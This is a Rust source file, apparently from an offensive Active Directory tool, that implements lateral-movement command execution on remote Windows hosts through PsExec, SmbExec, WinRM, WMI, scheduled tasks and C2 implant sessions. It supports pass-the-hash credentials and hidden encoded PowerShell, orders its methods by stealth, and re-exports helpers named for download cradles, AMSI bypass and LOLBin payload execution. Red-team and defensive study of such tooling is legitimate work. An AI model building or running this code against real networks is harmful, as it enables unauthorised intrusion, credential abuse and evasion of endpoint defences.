//! Remote command execution module.
//!
//! Provides multiple lateral movement execution methods:
//! - PSExec-style (SMB service creation)
//! - SmbExec (command-only, no binary drop)
//! - WinRM (WS-Management via native Win32 API or pure Rust)
//! - WMI (Win32_Process Create, with SCM fallback)
//! - AtExec (Scheduled Tasks via ATSVC)
//! - Plugin (via loaded plugin modules)
//! - C2 (via connected C2 framework sessions)
//!
//! Each method implements the `RemoteExecutor` trait for a unified interface.
//! All methods are cross-platform (Linux/macOS/Windows).

pub mod atexec;
pub mod lolbin;
pub mod modules;
pub mod psexec;
pub mod shell; // <- Export shell module
pub mod smbexec;
pub mod winrm;
pub mod wmiexec;

use crate::c2::C2Channel;
use crate::error::Result;
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use std::sync::Arc;

/// Output from a remote command execution
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecOutput {
    /// Standard output captured from the remote command.
    pub stdout: String,
    /// Standard error captured from the remote command.
    pub stderr: String,
    /// Status or error code
    pub exit_code: Option<i32>,
    /// Execution method that produced this output.
    pub method: ExecMethod,
}

/// Which execution method was used
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum ExecMethod {
    /// `PsExec` variant
    PsExec,
    /// `SmbExec` variant
    SmbExec,
    /// `WinRM` variant
    WinRM,
    /// `WmiExec` variant
    WmiExec,
    /// `AtExec` variant
    AtExec,
    /// Execution via a loaded plugin
    Plugin {
        /// Stable unique identifier.
        plugin_id: String,
    },
    /// Execution via a C2 framework session
    C2 {
        /// C2 framework name.
        framework: String,
        /// Stable unique identifier.
        session_id: String,
    },
}

impl std::fmt::Display for ExecMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::PsExec => write!(f, "PSExec"),
            Self::SmbExec => write!(f, "SMBExec"),
            Self::WinRM => write!(f, "WinRM"),
            Self::WmiExec => write!(f, "WMIExec"),
            Self::AtExec => write!(f, "AtExec"),
            Self::Plugin { plugin_id } => write!(f, "Plugin({})", plugin_id),
            Self::C2 {
                framework,
                session_id,
            } => {
                write!(f, "C2({}/{})", framework, session_id)
            }
        }
    }
}

/// Credentials for remote execution
#[derive(Debug, Clone)]
pub struct ExecCredentials {
    /// Domain FQDN
    pub domain: String,
    /// Username for authentication
    pub username: String,
    /// Password for authentication
    pub password: String,
    /// Optional: NTLM hash for pass-the-hash (hex string)
    pub nt_hash: Option<String>,
}

/// Unified trait for all remote execution methods
#[async_trait]
pub trait RemoteExecutor: Send + Sync {
    /// The execution method this executor uses
    fn method(&self) -> ExecMethod;

    /// Execute a single command on the remote target
    async fn execute(&self, target: &str, command: &str) -> Result<ExecOutput>;

    /// Execute a PowerShell command (base64-encoded for transport)
    async fn execute_powershell(&self, target: &str, script: &str) -> Result<ExecOutput> {
        let encoded = base64_encode_ps(script);
        let cmd = format!("powershell.exe -NoP -NonI -Enc {encoded}");
        self.execute(target, &cmd).await
    }

    /// Check if this execution method is available against the target
    async fn check_available(&self, _target: &str) -> bool;

    /// Clean up any artifacts left on the target
    async fn cleanup(&self, _target: &str) -> Result<()> {
        Ok(()) // default: no cleanup needed
    }
}

// ----------------------------------------------------------
// C2-backed executor -- wraps a C2 session as a RemoteExecutor
// ----------------------------------------------------------

/// Wraps a C2 channel + session ID into a RemoteExecutor
/// This lets C2 sessions participate in `auto_exec` alongside
/// native execution methods.
pub struct C2Executor {
    /// Object or account name.
    pub framework_name: String,
    /// Stable unique identifier.
    pub session_id: String,
    /// Object or account name.
    pub session_hostname: String,
    /// Bound C2 channel for execution.
    channel: Option<Arc<dyn C2Channel>>,
}

impl C2Executor {
    /// Create an unbound C2 executor (availability checks only).
    pub fn new(framework_name: String, session_id: String, hostname: String) -> Self {
        Self {
            framework_name,
            session_id,
            session_hostname: hostname,
            channel: None,
        }
    }

    /// Create a C2 executor bound to a live channel.
    pub fn with_channel(
        framework_name: String,
        session_id: String,
        hostname: String,
        channel: Arc<dyn C2Channel>,
    ) -> Self {
        Self {
            framework_name,
            session_id,
            session_hostname: hostname,
            channel: Some(channel),
        }
    }
}

#[async_trait]
impl RemoteExecutor for C2Executor {
    fn method(&self) -> ExecMethod {
        ExecMethod::C2 {
            framework: self.framework_name.clone(),
            session_id: self.session_id.clone(),
        }
    }

    async fn execute(&self, _target: &str, command: &str) -> Result<ExecOutput> {
        let Some(channel) = &self.channel else {
            return Err(crate::error::OverthroneError::ExecSimple(format!(
                "C2Executor has no bound channel (session={}, framework={})",
                self.session_id, self.framework_name
            )));
        };

        let result = channel.exec_command(&self.session_id, command).await?;
        Ok(ExecOutput {
            stdout: result.output,
            stderr: result.error,
            exit_code: Some(if result.success { 0 } else { 1 }),
            method: self.method(),
        })
    }

    async fn check_available(&self, target: &str) -> bool {
        // A C2 session is "available" if the target hostname matches
        self.session_hostname.eq_ignore_ascii_case(target)
    }
}

// Re-export LOLBin types for convenience
pub use lolbin::{
    LolConfig, LolMethod, LolPayload, all_download_cradles, bitsadmin_download,
    certutil_decode_exec, certutil_url_download, cscript_exec, execute_lolbin, mshta_inline_js,
    mshta_remote_hta, msiexec_remote_msi, powershell_amsi_bypass, powershell_download_cradle,
    regsvr32_sct, rundll32_js_exec, rundll32_sct, wmic_xsl_exec,
};

/// Base64-encode a PowerShell script for -EncodedCommand
fn base64_encode_ps(script: &str) -> String {
    use base64::Engine;
    // PowerShell expects UTF-16LE encoded base64
    let utf16: Vec<u8> = script
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    base64::engine::general_purpose::STANDARD.encode(&utf16)
}

/// Try all available execution methods in order of stealth
/// Order: C2 (if session exists) -> WinRM -> AtExec -> SmbExec -> PSExec -> WMI
/// If `c2_sessions` is provided, C2 sessions matching the target hostname
/// are tried first (most OPSEC-safe since traffic goes through existing implant).
pub async fn auto_exec(target: &str, command: &str, creds: &ExecCredentials) -> Result<ExecOutput> {
    use tracing::info;

    // Order: WinRM -> AtExec -> SmbExec -> PsExec -> WMI (most reliable first)
    #[allow(unused_mut)]
    let mut executors: Vec<Box<dyn RemoteExecutor>> = vec![
        Box::new(winrm::WinRmExecutor::new(creds.clone())),
        Box::new(atexec::AtExecutor::new(creds.clone())),
        Box::new(smbexec::SmbExecutor::new(creds.clone())),
        Box::new(psexec::PsExecutor::new(creds.clone())),
    ];
    // WmiExec only works on Windows -- skip on other platforms
    #[cfg(windows)]
    executors.push(Box::new(wmiexec::WmiExecutor::new(creds.clone())));

    for executor in &executors {
        if executor.check_available(target).await {
            info!("exec: Using {} for {target}", executor.method());
            return executor.execute(target, command).await;
        }
    }

    Err(crate::error::OverthroneError::ExecSimple(format!(
        "No execution method available for {target}"
    )))
}

/// Enhanced auto_exec that also considers C2 sessions
/// Tries C2 sessions first (best OPSEC), then falls back to native methods.
pub async fn auto_exec_with_c2(
    target: &str,
    command: &str,
    creds: &ExecCredentials,
    c2_executors: Vec<Box<dyn RemoteExecutor>>,
) -> Result<ExecOutput> {
    use tracing::info;

    // Try C2 sessions first (best OPSEC -- reuses existing implant)
    for executor in &c2_executors {
        if executor.check_available(target).await {
            info!("exec: Using {} for {target} (via C2)", executor.method());
            return executor.execute(target, command).await;
        }
    }

    // Fall back to native methods
    info!("exec: No C2 session for {target}, falling back to native methods");
    auto_exec(target, command, creds).await
}

#[cfg(test)]
mod tests {
    use base64::Engine;

    use super::*;

    #[test]
    fn test_base64_encode_powershell() {
        let script = "Write-Host 'test'";
        let encoded = base64_encode_ps(script);

        // Should be base64 of UTF-16LE
        assert!(encoded.len() > script.len());
        assert!(
            base64::engine::general_purpose::STANDARD
                .decode(&encoded)
                .is_ok()
        );
    }

    #[test]
    fn test_exec_method_display() {
        assert_eq!(ExecMethod::PsExec.to_string(), "PSExec");
        assert_eq!(ExecMethod::WinRM.to_string(), "WinRM");
        assert_eq!(ExecMethod::WmiExec.to_string(), "WMIExec");
        assert_eq!(ExecMethod::SmbExec.to_string(), "SMBExec");
        assert_eq!(
            ExecMethod::Plugin {
                plugin_id: "test".to_string()
            }
            .to_string(),
            "Plugin(test)"
        );
        assert_eq!(
            ExecMethod::C2 {
                framework: "Sliver".to_string(),
                session_id: "abc123".to_string(),
            }
            .to_string(),
            "C2(Sliver/abc123)"
        );
    }

    #[test]
    fn test_c2_executor_check_available() {
        let executor = C2Executor::new(
            "Sliver".to_string(),
            "session-123".to_string(),
            "DC01".to_string(),
        );

        // check_available is async, but we can verify the struct
        assert_eq!(executor.framework_name, "Sliver");
        assert_eq!(executor.session_hostname, "DC01");
    }
}
